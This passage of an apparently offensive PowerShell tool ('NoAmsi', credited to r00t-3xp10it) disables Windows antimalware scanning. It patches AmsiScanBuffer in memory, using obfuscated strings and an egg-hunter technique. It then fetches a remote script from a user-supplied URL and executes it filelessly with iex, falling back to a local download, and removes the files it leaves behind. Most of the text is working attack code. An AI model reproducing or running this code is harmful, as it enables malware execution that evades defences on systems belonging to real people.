         $test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
         $LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
         $test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
         $Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))

         [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);Start-Sleep -Milliseconds 670
         $Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
         [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("4",
                              "success",
                              "@_RastaMouse",
                              "AM`SI_RES`ULT_CLEAN",
                              "Execute: `"$JPGformat`"",
                              "string detection disabled!")|Out-Null

            #Display Output Table
            $mytable | Format-List > $env:TMP\tbl.log
            Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 1 |
               Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -Match '(success)$'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
                  Write-Host @stringformat $_
               }

            #POC
            Start-Sleep -Milliseconds 680
            Write-Host "Proof Of Concept - technic nº4" -ForegroundColor Yellow
            Write-Host "-------------------------------------------"
            Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n"

            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
            #success exec = exit
            exit
         }

      }catch{
         Write-Host "[error] executing 'AM`SI_RESULT_CLEAN' bypass!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n"
      }

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @am0nsec
         Helper - AM`SI_SCANBUFF`ER_PATCH!
      #>

      try{

         $Kernel32 = @"
         using System;
         using System.Runtime.InteropServices;

         public class Kernel32 {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string lpLibFileName);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

         Add-Type $Kernel32
         Class MyHunter {
           static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg){
               while($true){
                   [int]$count = 0

                   while($true){
                       [IntPtr]$address = [IntPtr]::Add($address, 1)
                       If([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)){
                           $count++
                           If($count -eq $egg.Length){
                               return [IntPtr]::Subtract($address, $egg.Length - 1)
                           }
                       } Else { break }
                   }
               }

               return $address
           }
       }

       [IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
       Write-Host "[+] AMSI DLL Handle: $hModule"

       [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
       Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

       If([IntPtr]::Size -eq 8) {
	       Write-Host "[+] Process architecture: 64-bits process"
           [byte[]]$egg = [byte[]] (
               0x4C, 0x8B, 0xDC,       # mov     r11,rsp
               0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
               0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
               0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
               0x57,                   # push    rdi
               0x41, 0x56,             # push    r14
               0x41, 0x57,             # push    r15
               0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
           )
       } Else {
	       Write-Host "[+] Process architecture: 32-bits process"
           [byte[]]$egg = [byte[]] (
               0x8B, 0xFF,             # mov     edi,edi
               0x55,                   # push    ebp
               0x8B, 0xEC,             # mov     ebp,esp
               0x83, 0xEC, 0x18,       # sub     esp,18h
               0x53,                   # push    ebx
               0x56                    # push    esi
           )
       }
       [IntPtr]$targetedAddress = [MyHunter]::FindAddress($dllCanUnloadNowAddress, $egg)
       Write-Host "[+] Targeted address: $targetedAddress`n"

       $oldProtectionBuffer = 0
       [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

       $patch = [byte[]] (
           0x31, 0xC0,    # xor rax, rax
           0xC3           # ret  
       )
       [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

       $a = 0
       [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("5",
                              "success",
                              "@am0nsec",
                              "AM`SI_SCANBUFF`ER_PATCH",
                              "Execute: `"$JPGformat`"",
                              "string detection disabled!")|Out-Null

            #Display Output Table
            $mytable | Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
               Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -Match '(success)$'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
                  Write-Host @stringformat $_
               }

            #POC
            Start-Sleep -Milliseconds 680
            Write-Host "Proof Of Concept - technic nº5" -ForegroundColor Yellow
            Write-Host "-------------------------------------------"
            Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n"

            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
         }

      }catch{
         Write-Host "[error] executing 'AM`SI_SCANBUFF`ER_PATCH' bypass!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n"
      }

}


If($PayloadURL -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download\Execute URL script.ps1 trougth AMS1_bypass!

   .NOTES
      This function does NOT accepts downloaded cmdlet arguments!
      But if you wish to execute the downloaded cmdlet with parameters then
      manualy edit NoAmsi.ps1 cmdlet and append the arguments to the follow line:

      #Executing cmdlet
      Import-Module -Name .\${RawName}.${extension} -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>

   .NOTES
      redpill framework allow attackers to execute the -payloadURL '<url>' with args!
   #>

   #Parse URL data
   $DomainName = $PayloadURL.Split('/')[2]
   $extension = $PayloadURL.Split('.')[-1]
   $RawName = ($PayloadURL.Split('/')[-1]) -replace '(.ps1|.psm1|.psd1)$',''

   If($PayloadURL -iNotMatch '^[http(s)://]')
   {
      #Wrong download fileformat syntax user input
      Write-Host "[error] -PayloadURL '<url>' requires http(s) url format!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 2;exit ## @NoAmsi    
   }
   
   If($PayloadURL -iNotMatch '(.ps1|.psm1|.psd1)$')
   {
      #Wrong download fileformat syntax user input
      Write-Host "[error] -PayloadURL '<url>' only accepts script.PS1|PSM1|PSD1 file formats!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 2;exit ## @NoAmsi    
   }

   If($PayloadURL -iMatch '^(https://)')
   {
      $PortNumber = "445"
   }
   ElseIf($PayloadURL -iMatch '^(http://)')
   {
      $PortNumber = "80"
   }

   #Build Table display
   Write-Host "Download\Execute '${RawName}.${extension}'" -ForegroundColor Yellow
   Write-Host "* [connecting to] $DomainName TCP $PortNumber .." -ForegroundColor DarkCyan
   Write-Host "     uri: $PayloadURL`n" -ForegroundColor DarkCyan 

   #Msxml2-Proxy-Downloader { FileLess }
   $TORnetwork=New-Object -ComObject Msxml2.XMLHTTP;$TORnetwork.open('GET',"$PayloadURL",$false);$TORnetwork.send();i`ex $TORnetwork.responseText

   try{#Executing cmdlet
      Import-Module -Name .\${RawName}.${extension} -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>
   }catch{
      iwr -Uri "$PayloadURL" -OutFile "$Env:TMP\${RawName}.${extension}"
      Write-Host "* fail to import ${RawName}.${extension} (fileless), defaulting to IWR (local download)`n" -ForegroundColor Red -BackgroundColor Black
      Start-Sleep -Seconds 3;&"$Env:TMP\${RawName}.${extension}" #<INPUT_CMDLET_ARGUMENT_LIST>   
   }

   If(-not($?))
   {
      Write-Host "[error] something went wrong executing\downloading ${RawName}.${extension}!`n" -ForegroundColor Red -BackgroundColor Black
      Write-Host ""
   }
                       
}

## Delete artifacts left behind
If(Test-Path -Path "$Env:TMP\${RawName}.${extension}" -ErrorAction SilentlyContinue)
{
   Remove-Item -Path "$Env:TMP\${RawName}.${extension}" -Force
}